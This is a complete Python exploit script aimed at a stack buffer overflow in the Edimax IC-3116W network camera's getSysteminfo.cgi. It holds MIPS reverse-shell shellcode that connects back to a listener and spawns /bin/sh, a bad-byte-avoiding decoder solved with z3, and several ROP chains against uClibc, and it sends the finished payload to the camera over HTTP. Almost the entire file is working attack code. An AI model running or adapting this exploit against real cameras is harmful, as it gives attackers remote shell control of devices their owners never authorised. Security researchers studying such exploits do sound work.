#!/usr/bin/env python

'''
# Description  
    Script to exploit stack-based buffer overflow in Edimax IC-3116W v3.06 (2019) network camera. 
'''

import socket
import struct
import time
from sys import exit

# z3 solver
from z3 import *

CAMERA_IP   = '<camera ip here>'
CAMERA_PORT = 80
L_IP        = '<listener ip here>' 
L_PORT      = 31337

BAD_BYTES = [i for i in range(0, 0x21)]
BAD_BYTES.extend([0x23, 0x5F, 0x7F, 0xFF])

def check_badbytes(req):
    for bb in BAD_BYTES:
        if bb in req[:-10]:
            print("Error: badbyte found in request")
            exit()

# returns two signed 2 byte values, where num1+num2 = res (without overflow)
# num1 and num2 doe not contain bad bytes
def semantic_signed_add_imm(res):
    x = BitVec('x', 16)
    y = BitVec('y', 16)

    solver = Solver()
    solver.add(x < 0)
    solver.add(x+y == res)

    for bb in BAD_BYTES:
        solver.add(x & 0xFF != bb)
        solver.add(y & 0xFF != bb)
        solver.add( ((x >> 8) & 0xFF) != bb )
        solver.add( ((y >> 8) & 0xFF) != bb )  

    if solver.check() == unsat:
        print("Z3 cannot solve the problem. Exit.")
        exit()
    
    m = solver.model()
    return m[x].as_long(), m[y].as_long()

# returns 2 short (2byte) values such that num1^num2 = res
# without containing any bad byte
def semantic_XOR_imm(res):
    x = BitVec('x', 16)
    y = BitVec('y', 16)

    solver = Solver()
    solver.add(x^y == res)

    for bb in BAD_BYTES:
        solver.add(x & 0xFF != bb)
        solver.add(y & 0xFF != bb)
        solver.add( ((x >> 8) & 0xFF) != bb )
        solver.add( ((y >> 8) & 0xFF) != bb )  

    if solver.check() == unsat:
        print("Z3 cannot solve the problem. Exit.")
        exit()
    
    m = solver.model()

    return m[x].as_long(), m[y].as_long()

# returns 2 32bit values such that val1-val2 = number
# without containing a bad byte
def solve_chain3_var1_2(number):
    s5 = BitVec("s5", 32)
    s0 = BitVec("s0", 32)

    solver = Solver()

    # add constraints
    solver.add( (s5 - s0) == number)

    # sp max val is 0x7FFFFFFF, so we need to stay inbetween 0x00000000-0x80000000
    solver.add( And(s5 > 0x00000000, s5 > 0x80000000 ))
    solver.add( And(s0 > 0x00000000, s0 > 0x80000000 ))

    for bb in BAD_BYTES:
        solver.add( s5 & 0xFF != bb)
        solver.add( s0 & 0xFF != bb)
        solver.add( ((s5 >> 8) & 0xFF) != bb)
        solver.add( ((s0 >> 8) & 0xFF) != bb)
        solver.add( ((s5 >> 16) & 0xFF) != bb)
        solver.add( ((s0 >> 16) & 0xFF) != bb)
        solver.add( ((s5 >> 24) & 0xFF) != bb)
        solver.add( ((s0 >> 24) & 0xFF) != bb)

    if solver.check() == unsat:
        print("Z3 cannot solve the problem. Exit. This should not happen.")
        exit()

    m = solver.model()
    return m[s5].as_long(), m[s0].as_long()
    

'''
#   Generates bash script to execute the payload locally.
#   Just for local debugging purposes.
#   example: payload_to_local('env_var.sh',payload)
#
#   how2 transfer to camera:
#       1.) connect to camera via telnetd
#       2.) download env_var.sh: ftpget <ip-addr> -u ftptest -p ftptest env_var.sh env_var.sh
#       3.) source ./env_var.sh && gdbserver 127.0.0.1:12345 /bin/ipcam_cgi
'''
def payload_to_local(filename, payload):
    fd = open(filename, "w")                                 # open file exclusive creation
    payload_hex = ''.join(['\\x%02x' % b for b in payload])  # hex representation "\xXX\xXX.."

    print("[+] Building local bash script")

    # build bash script to test exploit locally
    fd.write("#!/bin/sh\n\n")
    fd.write("export PAYLOAD=$'{0}'\n".format(payload_hex))

    fd.write("export SERVER_SOFTWARE=lighttpd/1.4.28-devel-2182\n")
    fd.write("export SERVER_NAME=0.0.0.0\n")
    fd.write("export GATEWAY_INTERFACE=CGI/1.1\n")
    fd.write("export SERVER_PROTOCOL=HTTP/1.1\n")
    fd.write("export SERVER_PORT=80\n")
    fd.write("export SERVER_ADDR=192.168.0.105\n")
    fd.write("export HOST=\n")
    fd.write("export REQUEST_METHOD=GET\n")
    fd.write("export GETREDIRECT_STATUS=200\n")
    fd.write("export QUERY_STRING=$PAYLOAD\n")
    fd.write("export REQUEST_URI=/camera-cgi/public/getSysteminfo.cgi?$PAYLOAD\n")
    fd.write("export URI_PATH=/camera-cgi/public/getSysteminfo.cgi\n")
    fd.write("export REMOTE_ADDR=192.168.0.101\n")
    fd.write("export SCRIPT_FILENAME=/www/camera-cgi/public/getSysteminfo.cgi\n")
    fd.write("export DOCUMENT_ROOT=/www\n")

    fd.close()

def build_shellcode(address, port):
    bport = port.to_bytes(2, byteorder='big')
    baddr = socket.inet_aton(address)

    FORK  = b'\x24\x11\xFF\xFF' # s1 = -1
    FORK += b'\x24\x04\x27\x0f' # li a0, 9999
    FORK += b'\x24\x02\x10\x46' # li v0, 4166 nanosleep()
    FORK += b'\x01\x01\x01\x0c' # syscall
    FORK += b'\x1E\x20\xFF\xFC' # bgtz s1,4 branch if > 0
    FORK += b'\x24\x11\x10\x2d' # li s1, 4141
    FORK += b'\x24\x02\x0f\xa2' # li v0, 4002 fork()
    FORK += b'\x01\x01\x01\x0c' # syscall
    FORK += b"\x24\x84\xFE\xED"*9
    FORK += b'\x1c\x40\xff\xf8' #bgtz > 0 == parent
    FORK += b"\x24\x84\xFE\xED"

    SHELLCODE = FORK
    SHELLCODE += b"\x24\x0f\xff\xfd"        #li      t7,-3
    SHELLCODE += b"\x01\xe0\x20\x27"        #nor     a0,t7,zero
    SHELLCODE += b"\x01\xe0\x28\x27"        #nor     a1,t7,zero
    SHELLCODE += b"\x28\x06\xff\xff"        #slti    a2,zero,-1
    SHELLCODE += b"\x24\x02\x10\x57"        #li      v0,4183 ( sys_socket )
    SHELLCODE += b"\x01\x01\x01\x0c"        #syscall 0x40404
    SHELLCODE += b"\xaf\xa2\xff\xff"        #sw      v0,-1(sp)
    SHELLCODE += b"\x8f\xa4\xff\xff"        #lw      a0,-1(sp)
    SHELLCODE += b"\x24\x0f\xff\xfd"        #li      t7,-3 ( sa_family = AF_INET )
    SHELLCODE += b"\x01\xe0\x78\x27"        #nor     t7,t7,zero
    SHELLCODE += b"\xaf\xaf\xff\xe0"        #sw      t7,-32(sp) 
    
    # Port
    SHELLCODE += b"\x3c\x0e"+bport          #lui     t6,bport ( sin_port = bport )
    SHELLCODE += b"\x35\xce"+bport          #ori     t6,t6,bport
    SHELLCODE += b"\xaf\xae\xff\xe4"        #sw      t6,-28(sp)

    # IP
    SHELLCODE += b"\x3c\x0d"+baddr[0:2]     #lui     t5,baddr[0:2]
    SHELLCODE += b"\x35\xad"+baddr[2:4]     #ori     t5,t5,baddr[2:4]
    SHELLCODE += b"\xaf\xad\xff\xe6"        #sw      t5,-26(sp)
    SHELLCODE += b"\x27\xa5\xff\xe2"        #addiu    a1,sp,-30
    SHELLCODE += b"\x24\x0c\xff\xef"        #li      t4,-17 ( addrlen = 16 )     
    SHELLCODE += b"\x01\x80\x30\x27"        #nor     a2,t4,zero 
    SHELLCODE += b"\x24\x02\x10\x4a"        #li      v0,4170 ( sys_connect ) 
    SHELLCODE += b"\x01\x01\x01\x0c"        #syscall 0x40404
    SHELLCODE += b"\x24\x0f\xff\xfd"        #li      t7,-3
    SHELLCODE += b"\x01\xe0\x28\x27"        #nor     a1,t7,zero
    SHELLCODE += b"\x8f\xa4\xff\xff"        #lw      a0,-1(sp)
    SHELLCODE += b"\x24\x02\x0f\xdf"        #li      v0,4063 ( sys_dup2 )
    SHELLCODE += b"\x01\x01\x01\x0c"        #syscall 0x40404
    SHELLCODE += b"\x20\xa5\xff\xff"        #addi    a1,a1,-1
    SHELLCODE += b"\x24\x01\xff\xff"        #li      at,-1
    SHELLCODE += b"\x14\xa1\xff\xfb"        #bne     a1,at, dup2_loop
    SHELLCODE += b"\x3c\x0f\x2f\x2f"        #lui     t7,0x2f2f
    SHELLCODE += b"\x35\xef\x62\x69"        #ori     t7,t7,0x6269
    SHELLCODE += b"\xaf\xaf\xff\xf4"        #sw      t7,-12(sp)
    SHELLCODE += b"\x3c\x0e\x6e\x2f"        #lui     t6,0x6e2f
    SHELLCODE += b"\x35\xce\x73\x68"        #ori     t6,t6,0x7368
    SHELLCODE += b"\xaf\xae\xff\xf8"        #sw      t6,-8(sp)
    SHELLCODE += b"\xaf\xa0\xff\xfc"        #sw      zero,-4(sp)
    SHELLCODE += b"\x27\xa4\xff\xf4"        # addiu   a0,sp,-12 -> pointer to /bin/sh
    SHELLCODE += b"\xAF\xA4\xFF\xEC"        # sw a0, -20(sp)
    SHELLCODE += b"\xaf\xa0\xFF\xF0"        # sw zero, -16(sp)
    SHELLCODE += b"\x27\xa5\xff\xec"        # addiu a1, sp, -20 -> pointer to {*a1, 0}
    SHELLCODE += b"\x27\xa6\xff\xfC"        # addiu a2,sp,-4 -> pointer to 0
    SHELLCODE += b"\x24\x02\x0f\xab"        #li      v0,4011 ( sys_execve )
    SHELLCODE += b"\x01\x01\x01\x0c"        #syscall 0x40404
    SHELLCODE += b"\x10\x00\x00\x27"        #b

    return SHELLCODE

def create_decoder(shellcode):
    decoder = b''
    for i in range(0, len(shellcode)):
        # $a0 = 0
        decoder += b'\x30\x84\x55\x55' # andi $a0 $a0 0x5555
        decoder += b'\x30\x84\xaa\xaa' # andi $a0 $a0 0xaaaa

        # extract next byte from shellcode
        word = int.from_bytes(shellcode[i:i+1], byteorder='big')

        # if byte not in shellcode, just add to a0 (which results in val+0 = val = a0)
        if shellcode[i] not in BAD_BYTES:
            decoder+=(b'\x24\x84\x33'+word.to_bytes(1, byteorder='big')) # ADDIu $a0, $a0, val1
        else:
            # solve val1^val2 = word
            xor_vals = semantic_XOR_imm(word)

            val1 = xor_vals[0].to_bytes(2, byteorder='big')
            val2 = xor_vals[1].to_bytes(2, byteorder='big')

            # $a0 = byte of shellcode
            decoder+=(b'\x24\x84'+val1) # ADDIu $a0, $a0, val1 => since a0 is 0, a0 = val1
            decoder+=(b'\x38\x84'+val2) # XORI $a0, $a0, val2 => a0 = a0(val1) ^ val2 = word

        # next move calculated byte into memory
        # [$s7+0x2525] = word (word = part of shellcode)
        decoder+=b'\xa2\xe4\x25\x25' # sw $a0 0x2525 $s7

        # inc pointer; $s7 = $s7+1
        decoder+=b'\x26\xF7\x44\xc1' # ADDIU $s7 $s7 17601
        decoder+=b'\x26\xF7\xbb\x40' # ADDIU $s7 $s7 -17600
    return decoder

PLACEHOLDER = 0x47474747

'''
libuClibc-0.9.30.3.so base and function offsets
'''

BASE   = 0x2aae0000
SLEEP  = 0x00056DF0
MALLOC = 0x0004F638
STRCPY = 0x000346C0

'''
ROP Chain #1
------------

    The whole payload is stored on the stack because the GET-parameter
    is passed via env. variables. Luckily the pointer to the stack is stored
    in a static global variable. Using ROP2 in this chain, we can calculate
    this address (0x43bbe8), deref it to get the ptr(ROP4) and move it into $sp.
    sp then points to the rest of the payload.
'''

CHAIN1_ROP1 = 0x000452C8
CHAIN1_ROP2 = 0x00044E3C
CHAIN1_ROP3 = 0x0003CB68
CHAIN1_ROP4 = 0x00027938
CHAIN1_ROP5 = 0x000556B8

'''
ROP Chain #2
------------

    This chain increases the stack pointer and loads the values
    used to calculate the jalr [sleep] instruction to flush caches
    right after the decoder does its work. The instruction will be copied
    inbetween decoder and (prospective) shellcode.

    CHAIN2_OP_VAL1 + CHAIN_OP_VAL2 = 0x10220f809 = jalr $s1

    This stops the exploit from crashing before the caches are
    being flushed.

'''

CHAIN2_ROP1    = 0x00046dc8
CHAIN2_ROP2    = 0x000452c8
CHAIN2_ROP3    = CHAIN2_ROP1
CHAIN2_OP_VAL1 = 0x3f2efe7e
CHAIN2_OP_VAL2 = 0xc2f1f98b

'''
ROP Chain #3
------------

    This chain stores the result from chain #2 @ $sp+(CHAIN3_VAR1-CHAIN3_VAR2), 
    which is the first instruction right after where the decoder will take place.
    Since the decoder will be calculated at runtime, VAR1 and VAR2 are variable
    and will be overwritten later.

    Chain #3 also loads the values (size) needed for malloc in the next chain.

'''

CHAIN3_VAR1  = 0x6fdffb73
CHAIN3_VAR2  = 0x6fdfdf77
CHAIN3_ROP2  = 0x000342b0
CHAIN3_ROP3  = 0x00017db0
CHAIN3_ROP4  = 0x00053cf8
CHAIN3_ROP5  = 0x0003b5d4
CHAIN3_ROP5_1= 0x0005733c
CHAIN3_ROP6  = 0x00019c50
CHAIN3_ROP7  = 0x0005219c
CHAIN3_ROP8  = 0x00043a70

'''
ROP Chain #4
------------

    As the exploit is prepared now, malloc(0x2000) is used to allocate memory
    needed for the decoder. Next strcpy is invoked to write the decoder
    into the heap. Before continuing execution on the heap, sleep needs
    to be called, to flush the caches. From now the decoder will start
    execution and thus the shellcode will be written bytewise. The destination
    of the shellcode is right below the decoder and jalr $s1 instruction that
    has been written into memory using chain #2+3. When the decoder finished execution
    jalr $s1 is called to flush the caches again. $s1 has been loaded with sleep addr
    right before the execution of the decoder started.

    STR_VAR1-STR_VAR2 = offset to decoder
    STR_VAR1 and STR_VAR2 are dynamic values and are calculated after payload creation

'''

MALLOC_VAL1     = 0x45454545
MALLOC_VAL2     = 0xbabadabb # VAL1+Val2 = 0x2000 = malloc(0x2000)
ROP_MALLOC1     = 0x000342b0
ROP_MALLOC2     = 0x00035a4c
ROP_MALLOC3     = 0x0003c340
ROP_MALLOC4     = 0x00014f84

STR_VAR1        = 0x25b3fc83
STR_VAR2        = 0x25b3fb7b
ROP_STRCPY1     = 0x00053cf8
ROP_STRCPY1_1   = 0x0003b5d4
ROP_STRCPY2     = 0x0005733c
ROP_STRCPY3     = 0x000342b4
ROP_STRCPY3_1   = 0x00035a4c
ROP_STRCPY4     = 0x0003c340
ROP_STRCPY5     = 0x0002b17c

ROP_SLEEP1      = 0x00019c50
ROP_SLEEP2      = 0x00058044 # sleep 1 second
# gadget for debugging puposes only. Sleeps 0xe seconds to be able to attach debugger
#ROP_SLEEP2     = 0x000289e0 # sleep 0xe seconds 
ROP_SLEEP3      = 0x00043f48
ROP_JMP_HEAP1   = 0x00057340

'''
The following values prevent the program from crashing 
in strtok_r and strspn() right after stack overflow occurs.
PASS1 and PASS2 are static non-aslr addresses pointing to 0 bytes, 
such that the application won't crash before EIP is pop'ed off the stack
'''
PASS1 = b'\x2A\xAE\x41\x41'
PASS2 = b'\x2A\xB4\xF1\xA4'

# payload starts here
payload = b'group=AAAAAAAAAA'
payload += struct.pack(">I", BASE+CHAIN1_ROP4)
payload += b'A'*16
payload += struct.pack(">I", BASE+CHAIN2_ROP1)
# frame of CHAIN2_ROP1
payload += b'C'*79+b'_'+(b'A'*119+b'_')*3+b'A'*36
payload += struct.pack(">I", BASE+CHAIN2_ROP2)
payload += b'B'*0x1c
payload += struct.pack(">I", CHAIN2_OP_VAL2)
payload += b'B'*20
payload += struct.pack(">I", BASE+CHAIN2_ROP3)
# SP is here when CHAIN2_ROP3 gets called
payload += b'C'*23+b'_'+(b'A'*119+b'_')*3
# CHAIN2_ROP3 OFFSET 384
payload += PASS1
payload += b'CCCC'
# Entry; EIP -> BASE+CHAIN1_ROP1
payload+=struct.pack(">I", BASE+CHAIN1_ROP1)

# frame of CHAIN1_ROP1
payload += PASS2
payload += b'AAAA'*6                                  # -> $s0
payload += struct.pack(">I", 0x4185312d)              # -> $s1
payload += struct.pack(">I", 0x41417565)              # -> $s2
payload += struct.pack(">I", 0xE971E153)              # -> $s3
payload += b'AAAA'                                    # -> $s4
payload += struct.pack(">I", BASE+CHAIN1_ROP3)        # -> $s5
payload += b'AAAA'                                    # -> $s6
payload += struct.pack(">I", BASE+CHAIN1_ROP2)        # -> $ra
payload += b'_'+b'A'*19
# frame of CHAIN2_ROP3
payload += struct.pack(">I", CHAIN2_OP_VAL1)          # -> $s0
payload += struct.pack(">I", BASE+CHAIN3_ROP2)        # -> $ra
# frame of CHAIN3_ROP2
payload += b'A'*0x1C
payload += struct.pack(">I", BASE+CHAIN3_ROP4)        # -> $s0
payload += b'A'*4                                     # -> $s1
payload += struct.pack(">I", BASE+CHAIN3_ROP3)        # -> $ra
# frame of CHAIN3_ROP4
MEASURE_1 = len(payload)+0x18

payload += b'A'*(0x24)
payload += struct.pack(">I", BASE+CHAIN3_ROP5)        # -> $ra
# frame of CHAIN3_ROP5
payload += b'A'*0x1C
payload += struct.pack(">I", BASE+CHAIN3_VAR2)        # -> $s0
payload += b'A'*4*4                                   # -> $s1,2,3,4
payload += struct.pack(">I", BASE+CHAIN3_VAR1)        # -> $s5
payload += b'A'*4                                     # -> $s6
payload += struct.pack(">I", BASE+CHAIN3_ROP6)        # -> $s7
payload += struct.pack(">I", BASE+CHAIN3_ROP5_1)      # -> $ra
# frame of CHAIN3_ROP6
payload += b'A'*0x24
payload += struct.pack(">I", BASE+CHAIN3_ROP8)        # -> $s3
payload += b'A'*4                                     # -> $s4
payload += struct.pack(">I", BASE+CHAIN3_ROP7)        # -> $ra
# frame of CHAIN3_ROP8
payload += b'A'*0x24
payload += struct.pack(">I", MALLOC_VAL1)             # -> $s0
payload += struct.pack(">I", MALLOC_VAL2)             # -> $s1
payload += struct.pack(">I", BASE+ROP_MALLOC1)        # -> $ra
# frame of ROP_MALLOC1
payload += b'A'*0x1C
payload += struct.pack(">I", BASE+MALLOC)             # -> $s0
payload += struct.pack(">I", BASE+ROP_MALLOC3)        # -> $s1
payload += struct.pack(">I", BASE+ROP_MALLOC2)        # -> $ra
# frame of ROP_MALLOC3
payload += b'A'*0x24
payload += struct.pack(">I", BASE+ROP_MALLOC4)        # -> $ra
# frame of ROP_MALLOC4
payload += b'A'*0x24
payload += struct.pack(">I", BASE+ROP_STRCPY1)        # -> $ra
# frame of ROP_STRCPY1
MEASURE_3 = len(payload)+0x18
payload += b'A'*0x24
payload += struct.pack(">I", BASE+ROP_STRCPY1_1)      # -> $ra
# frame of ROP_STRCPY1_1
payload += b'A'*0x1c  
payload += struct.pack(">I", STR_VAR2)                # -> $s0
payload += b'A'*4*2                                   # -> $s2,$s1
payload += struct.pack(">I", BASE+ROP_SLEEP1)         # -> $s3
payload += b'A'*4                                     # -> $s4
payload += struct.pack(">I", STR_VAR1)                # -> $s5
payload += b'A'*4                                     # -> $s6
payload += struct.pack(">I", BASE+ROP_STRCPY3)        # -> $s7
payload += struct.pack(">I", BASE+ROP_STRCPY2)        # -> $ra
# frame of ROP_STRCPY3
payload += b'A'*0x1c
payload += struct.pack(">I", BASE+STRCPY)             # -> $s0
payload += struct.pack(">I", BASE+ROP_STRCPY4)        # -> $s1
payload += struct.pack(">I", BASE+ROP_STRCPY3_1)      # -> $ra
# frame of ROP_STRCPY4
payload += b'A'*0x24
payload += struct.pack(">I", BASE+ROP_STRCPY5)        # -> $ra
# frame of ROP_SLEEP1
payload += b'A'*0x1c
payload += struct.pack(">I", BASE+SLEEP)              # -> $s0
payload += b'A'*4
payload += struct.pack(">I", BASE+ROP_SLEEP3)         # -> $s3
payload += b'A'*4
payload += struct.pack(">I", BASE+ROP_SLEEP2)         # -> $ra
# frame of ROP_SLEEP3
payload += b'A'*0x28
payload += struct.pack(">I", BASE+SLEEP)              # -> $s1
payload += b'A'*4*2                                   # -> $s2,$s3
payload += struct.pack(">I", BASE+ROP_JMP_HEAP1)      # -> $ra

# Start of decoder here =>
MEASURE_4 = len(payload)

# create shellcode decoder
shellcode = build_shellcode(L_IP, L_PORT)
decoder = create_decoder(shellcode)

# offset where the shellcode will be written to
#                        11*4 = jmp area   2*4 = 2 add instr above the decoder
offset_to_shellcode = len(decoder) + 11*4 + 2*4
# since the decoder uses offset 0x2525 + $s7 to write bytes into memory
# 0x2525+x+y = offset_to_shellcode
# again calculate 2 short values such that 0x2525+x+y = offset_to_shellcode. without overflow.
x_y = offset_to_shellcode - 0x2525

imm_vals = semantic_signed_add_imm(x_y)

val1 = imm_vals[0].to_bytes(2, byteorder='big')
val2 = imm_vals[1].to_bytes(2, byteorder='big')

# set $s7 near to the jump
payload+=(b'\x26\xF7'+val1) # ADDIU $s7 $s7 val1
payload+=(b'\x26\xF7'+val2) # ADDIU $s7 $s7 val2

payload+=decoder

# a0= 0 for sleep
payload += b'\x30\x84\x55\x55' # andi $a0 $a0 0x5555
payload += b'\x30\x84\xaa\xaa' # andi $a0 $a0 0xaaaa

# t9 = 0
payload += b'\x33\x39\x55\x55' # andi $t9 $t9 0x5555
payload += b'\x33\x39\xaa\xaa' # andi $t9 $t9 0xaaaa

# a0 = 1
xor_vals = semantic_XOR_imm(1) # 30 second sleep

val1 = xor_vals[0].to_bytes(2, byteorder='big')
val2 = xor_vals[1].to_bytes(2, byteorder='big')

payload+=(b'\x38\x84'+val1) # XORI $a0, $a0, val1 => since a0 is 0, a0 = val1
payload+=(b'\x38\x84'+val2) # XORI $a0, $a0, val2 => a0 = a0(val1) ^ val2 = sleep_time

# t9 = s1 = sleep
imm_vals = semantic_signed_add_imm(0)

val1 = imm_vals[0].to_bytes(2, byteorder='big')
val2 = imm_vals[1].to_bytes(2, byteorder='big')

payload+=(b'\x26\x39'+val1) # addiu $t9 $s1 val1
payload+=(b'\x27\x39'+val2) # addiu $t9 $t9 val2


MEASURE_2 = len(payload)

CHAIN_VAR1, CHAIN_VAR2 = solve_chain3_var1_2(MEASURE_2-MEASURE_1)
CHAIN_STR1, CHAIN_STR2 = solve_chain3_var1_2(MEASURE_4-MEASURE_3)

if (CHAIN3_VAR1 != CHAIN_VAR1 or CHAIN3_VAR2 != CHAIN_VAR2 or STR_VAR1 != CHAIN_STR1 or STR_VAR2 != CHAIN_STR2):
    print("Please set the following variables in exploit.py:")
    print("CHAIN3_VAR1: {0}, CHAIN3_VAR2: {1}".format(hex(CHAIN_VAR1), hex(CHAIN_VAR2)))
    print("STR_VAR1:    {0}, STR_VAR2:    {1}".format(hex(CHAIN_STR1), hex(CHAIN_STR2)))
    exit()

payload+=b'\x24\x84\xFE\xED' # <- will be replaced by jmp -1/jalr sleep
payload+=b'\x24\xA5\xFE\xED'*2
# shellcode will be written here
# reserve place for encoded shellcode
payload+=b'\x24\xA5\xFE\xED'*400
payload+=b'\x41\x41'

GET_REQUEST = b'GET /camera-cgi/public/getSysteminfo.cgi?'
GET_REQUEST+=payload
GET_REQUEST+=b' HTTP/1.1\r\n\r\n'

# For some reason, if the payload size is not divisible by 4, the stack alignment
# changes. In case we jump on the stack and the stack address is not %4==0,
# the program will crash printing BUS error => because EIP/PC needs to be %4==0
if len(GET_REQUEST)%4 != 0:
    print("[-] Payload size % 4 is unequal to zero.")
    print("[-] See code for explanation.")
    exit()

print("[+] Open socket")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target = (CAMERA_IP, CAMERA_PORT)
print("[+] Connecting to {0}".format(target[0]))
s.connect(target)

print("[+] Sending payload..")
resp = ''

s.sendall(GET_REQUEST)
result = s.recv(10000)
print(result.decode())
print("Payload length: {0}".format(len(GET_REQUEST)))
s.close()
